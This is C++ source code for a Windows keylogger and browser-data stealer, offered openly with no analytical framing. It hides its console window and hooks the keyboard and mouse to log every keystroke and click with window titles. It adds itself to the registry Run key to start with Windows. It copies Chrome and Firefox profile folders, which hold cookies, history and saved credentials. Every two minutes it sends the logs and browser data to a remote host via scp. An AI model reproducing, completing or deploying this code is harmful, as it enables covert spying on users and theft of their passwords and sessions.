#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
#include <map>
#include <tchar.h>
#include <ctime>
#include <thread>
#include <ShlObj.h>
#include <vector>
#include <string>
#include <utility>
#include <wininet.h>
#include <iphlpapi.h>
#include <cstdlib>

#pragma comment(lib, "wininet")
#pragma comment(lib, "iphlpapi.lib")

using namespace std;

// Define global variables for keyboard and mouse hooks
HHOOK hKeyboardHook;
HHOOK hMouseHook;

// Map special keys to their respective string representations
map<int, string> specialKeys = {
    {VK_BACK, "[BACKSPACE]"},
    {VK_TAB, "[TAB]"},
    {VK_RETURN, "[ENTER]"},
    {VK_SHIFT, "[SHIFT]"},
    {VK_CONTROL, "[CTRL]"},
    {VK_MENU, "[ALT]"},
    {VK_CAPITAL, "[CAPS_LOCK]"},
    {VK_ESCAPE, "[ESC]"},
    {VK_SPACE, " "},
    {VK_PRIOR, "[PAGE_UP]"},
    {VK_NEXT, "[PAGE_DOWN]"},
    {VK_END, "[END]"},
    {VK_HOME, "[HOME]"},
    {VK_LEFT, "[LEFT]"},
    {VK_UP, "[UP]"},
    {VK_RIGHT, "[RIGHT]"},
    {VK_DOWN, "[DOWN]"},
    {VK_SELECT, "[SELECT]"},
    {VK_PRINT, "[PRINT]"},
    {VK_EXECUTE, "[EXECUTE]"},
    {VK_SNAPSHOT, "[PRINT_SCREEN]"},
    {VK_INSERT, "[INSERT]"},
    {VK_DELETE, "[DELETE]"},
    {VK_HELP, "[HELP]"},
    {VK_LWIN, "[LEFT_WIN]"},
    {VK_RWIN, "[RIGHT_WIN]"},
    {VK_APPS, "[APPLICATION]"},
    {VK_SLEEP, "[SLEEP]"},
    {VK_NUMPAD0, "[NUMPAD_0]"},
    {VK_NUMPAD1, "[NUMPAD_1]"},
    {VK_NUMPAD2, "[NUMPAD_2]"},
    {VK_NUMPAD3, "[NUMPAD_3]"},
    {VK_NUMPAD4, "[NUMPAD_4]"},
    {VK_NUMPAD5, "[NUMPAD_5]"},
    {VK_NUMPAD6, "[NUMPAD_6]"},
    {VK_NUMPAD7, "[NUMPAD_7]"},
    {VK_NUMPAD8, "[NUMPAD_8]"},
    {VK_NUMPAD9, "[NUMPAD_9]"},
    {VK_MULTIPLY, "[MULTIPLY]"},
    {VK_ADD, "[ADD]"},
    {VK_SEPARATOR, "[SEPARATOR]"},
    {VK_SUBTRACT, "[SUBTRACT]"},
    {VK_DECIMAL, "[DECIMAL]"},
    {VK_DIVIDE, "[DIVIDE]"},
    {VK_F1, "[F1]"},
    {VK_F2, "[F2]"},
    {VK_F3, "[F3]"},
    {VK_F4, "[F4]"},
    {VK_F5, "[F5]"},
    {VK_F6, "[F6]"},
    {VK_F7, "[F7]"},
    {VK_F8, "[F8]"},
    {VK_F9, "[F9]"},
    {VK_F10, "[F10]"},
    {VK_F11, "[F11]"},
    {VK_F12, "[F12]"},
    {VK_NUMLOCK, "[NUM_LOCK]"},
    {VK_SCROLL, "[SCROLL_LOCK]"},
    {VK_PRIOR, "[SCROLLWHEELUP]"},
    {VK_NEXT, "[SCROLLWHEELDOWN]"},
};

// Function to get the current date and time
string getCurrentDateTime() {
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), "[%Y-%m-%d %X] ", &tstruct);
    return buf;
}

// Callback function for handling keyboard events
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static time_t lastLogTime = 0;
    static HWND lastActiveWindow = nullptr;
    time_t currentTime = time(0);

    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        ofstream logfile;
        logfile.open("keylogs.log", fstream::app);

        HWND currentActiveWindow = GetForegroundWindow();
        if (currentActiveWindow != lastActiveWindow || difftime(currentTime, lastLogTime) >=10) {
            TCHAR windowTitle[256];
            GetWindowText(currentActiveWindow, windowTitle, sizeof(windowTitle));
            logfile << "\n" << getCurrentDateTime() << " - " << windowTitle << "\n";
            lastLogTime = currentTime;
            lastActiveWindow = currentActiveWindow;
        }

        if (specialKeys.find(pKeyBoard->vkCode) != specialKeys.end()) {
            logfile << specialKeys[pKeyBoard->vkCode];
        } else {
            BYTE keyState[256];
            GetKeyboardState(keyState);
            wchar_t buffer[5];
            int toUnicodeReturn = ToUnicode(pKeyBoard->vkCode, pKeyBoard->scanCode, keyState, buffer, sizeof(buffer) / sizeof(buffer[0]), 0);
            if (toUnicodeReturn > 0) {
                for (int i = 0; i < toUnicodeReturn; i++) {
                    logfile << (char)buffer[i];
                }
            }
        }

        logfile.close();
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Callback function for handling mouse events
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static time_t lastLogTime = 0;
    static HWND lastActiveWindow = nullptr;
    time_t currentTime = time(0);

    if (nCode == HC_ACTION) {
        ofstream logfile;
        logfile.open("keylogs.log", fstream::app);

        HWND currentActiveWindow = GetForegroundWindow();
        if (currentActiveWindow != lastActiveWindow || difftime(currentTime, lastLogTime) >=10) {
            TCHAR windowTitle[256];
            GetWindowText(currentActiveWindow, windowTitle, sizeof(windowTitle));
            logfile << "\n" << getCurrentDateTime() << " - " << windowTitle << "\n";
            lastLogTime = currentTime;
            lastActiveWindow = currentActiveWindow;
        }

        switch (wParam) {
            case WM_LBUTTONDOWN:
                logfile << "[LEFT CLICK]";
                break;
            case WM_RBUTTONDOWN:
                logfile << "[RIGHT CLICK]";
                break;
            case WM_MBUTTONDOWN:
                logfile << "[MIDDLE CLICK]";
                break;
            case WM_MOUSEWHEEL:
                if (GET_WHEEL_DELTA_WPARAM(((MSLLHOOKSTRUCT *)lParam)->mouseData) > 0) {
                    logfile << "[SCROLLWHEELUP]";
                } else {
                    logfile << "[SCROLLWHEELDOWN]";
                }
                break;
        }
        logfile.close();
    }
    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

// Function to set keyboard and mouse hooks
void setHooks() {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
}

// Function to remove keyboard and mouse hooks
void unHook() {
    UnhookWindowsHookEx(hKeyboardHook);
    UnhookWindowsHookEx(hMouseHook);
}

// Function to add keylogger to startup
void addToStartup() {
    HKEY hKey;
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);
    RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
    RegSetValueEx(hKey, _T("Keylogger"), 0, REG_SZ, (BYTE *)szPath, sizeof(szPath));
    RegCloseKey(hKey);
}

bool FileExists(const std::string& path) {
    DWORD dwAttrib = GetFileAttributes(path.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
         !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

std::string GetMostRecentlyModifiedFolder(const std::string& path) {
    WIN32_FIND_DATA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    FILETIME ftLastWrite;
    ZeroMemory(&ftLastWrite, sizeof(FILETIME));
    std::string latestFolder;

    std::string search_path = path + "\\*";
    hFind = FindFirstFile(search_path.c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE)  return "";

    do {
        if (strcmp(ffd.cFileName, ".") != 0 && strcmp(ffd.cFileName, "..") != 0) {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (CompareFileTime(&ffd.ftLastWriteTime, &ftLastWrite) > 0) {
                    ftLastWrite = ffd.ftLastWriteTime;
                    latestFolder = ffd.cFileName;
                }
            }
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    FindClose(hFind);
    return latestFolder;
}

void CopyFolderContent(const std::string& sourceFolder, const std::string& destFolder) {
    WIN32_FIND_DATA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    std::string search_path = sourceFolder + "\\*";
    hFind = FindFirstFile(search_path.c_str(), &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string filePath = sourceFolder + "\\" + ffd.cFileName;
                CopyFile(filePath.c_str(), (destFolder + ffd.cFileName).c_str(), FALSE);
            }
        } while (FindNextFile(hFind, &ffd) != 0);
        FindClose(hFind);
    }
}

std::vector<std::string> GetAllFoldersWithPattern(const std::string& path, const std::string& pattern) {
    WIN32_FIND_DATA ffd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    std::vector<std::string> folders;

    std::string search_path = path + "\\*";
    hFind = FindFirstFile(search_path.c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE)  return folders;

    do {
        if (strcmp(ffd.cFileName, ".") != 0 && strcmp(ffd.cFileName, "..") != 0) {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (strstr(ffd.cFileName, pattern.c_str()) != nullptr) {
                    folders.push_back(ffd.cFileName);
                }
            }
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    FindClose(hFind);
    return folders;
}

bool CreateAllDirectories(const std::string& path) {
    DWORD ftyp = GetFileAttributesA(path.c_str());
    if (ftyp == INVALID_FILE_ATTRIBUTES) {
        size_t pos = 0;
        do {
            pos = path.find_first_of("\\/", pos + 1);
            CreateDirectory(path.substr(0, pos).c_str(), NULL);
        } while (pos != std::string::npos);
    }
    else if (!(ftyp & FILE_ATTRIBUTE_DIRECTORY)) {
        return false;
    }
    return true;
}

void saveBrowserData() {
    CHAR szPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath))) {
        string path(szPath);
        string chromePath = path + "\\Google\\Chrome\\User Data\\";

        // Handle Default profile
        string defaultProfile = chromePath + "Default\\";
        string destFolderChromeDefault = "browser_data\\chrome\\Default\\";
        CreateAllDirectories(destFolderChromeDefault);
        CopyFolderContent(defaultProfile, destFolderChromeDefault);

        // Handle the most recently modified Chrome profile
        string latestChromeFolder = GetMostRecentlyModifiedFolder(chromePath);
        if (!latestChromeFolder.empty() && latestChromeFolder != "Default") {
            string latestChromeProfile = chromePath + latestChromeFolder + "\\";
            string destFolderChrome = "browser_data\\chrome\\" + latestChromeFolder + "\\";
            CreateAllDirectories(destFolderChrome);
            CopyFolderContent(latestChromeProfile, destFolderChrome);
        }
    }

    CHAR szPathFirefox[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, szPathFirefox))) {
        string firefoxPathOriginal = string(szPathFirefox) + "\\Mozilla\\Firefox\\Profiles\\";
        vector<string> allFirefoxProfiles = GetAllFoldersWithPattern(firefoxPathOriginal, "default-release");

        // Handle all Firefox profiles with "default-release" in the name
        for (const string& profileFolder : allFirefoxProfiles) {
            string profileFolderPath = firefoxPathOriginal + profileFolder + "\\";
            string destFolderFirefox = "browser_data\\firefox\\" + profileFolder + "\\";
            CreateAllDirectories(destFolderFirefox);
            CopyFolderContent(profileFolderPath, destFolderFirefox);
        }
    }
}

void transferFiles() {
    system("scp -P 22 -r browser_data user@192.168.0.1:C:/path/to/folder");
    system("scp -P 22 keylogs.log user@192.168.0.1:C:/path/to/folder");
}

void copyAndRenameFile() {
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);  // Gets the path of the current executable
    
    TCHAR szNewPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, szNewPath))) {
        _tcscat_s(szNewPath, _T("\\Default\\AppData\\keylogger.exe"));
        CopyFile(szPath, szNewPath, FALSE);  // Copies the file to the new location with the new name
    }
}

void runOnStartup() {
    HKEY hKey;
    TCHAR szPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath))) {
        _tcscat_s(szPath, _T("\\Temp\\keylogger.exe"));
        RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
        RegSetValueEx(hKey, _T("keylogger"), 0, REG_SZ, (BYTE *)szPath, (_tcslen(szPath) + 1) * sizeof(TCHAR));  // Sets the registry key to run the program on startup
        RegCloseKey(hKey);
    }
}

int main() {
    HWND stealth; // Hide console window
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    copyAndRenameFile();
    runOnStartup();
    setHooks(); // Set keyboard and mouse hooks
    addToStartup(); //Add Keylogger to Startup
    saveBrowserData(); // Save browser history, cookies, and session data

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    static DWORD lastTransfer = GetTickCount();
        if (GetTickCount() - lastTransfer >= 2 * 60 * 1000) {  // 2 minutes
            transferFiles();
            lastTransfer = GetTickCount();
        }
    }

    unHook(); // Unhook the hooks before the program exits

    return 0;
}